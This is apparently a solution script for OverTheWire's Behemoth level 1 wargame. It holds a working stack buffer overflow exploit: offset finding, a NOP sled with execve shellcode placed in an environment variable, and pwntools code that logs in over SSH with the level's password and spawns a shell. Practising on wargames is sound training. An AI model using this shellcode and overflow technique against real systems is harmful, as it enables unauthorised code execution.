from pwn import *

'''
local exploit:
    cyclic 150
Then give the output to the program in gdb. Next, you'll get the offset of 71 bytes.
Checking:
    r < <(python -c 'print "A" * 71 + "B"*4')
Working.
Binary is without PIE, NX, Canary and so on.
So, it is just a usual stack overflow thing, but without source file as in the narnia serial.
Now, you need to create a env variable with NOP chain and shellcode
Other methods will not work here.
export EGG=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
(python -c 'print "A"*71  +"B"*4';cat) | /behemoth/behemoth1
'''

con = ssh('behemoth1', 'behemoth.labs.overthewire.org', password='aesebootiv', port=2221)
p = con.process('/behemoth/behemoth1', env={'EGG': "\x90" * 10000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"})
p.sendline(b"A"*71 + p32(0xffffde7c))
print(p.recv())
print(p.recv())
p.interactive()
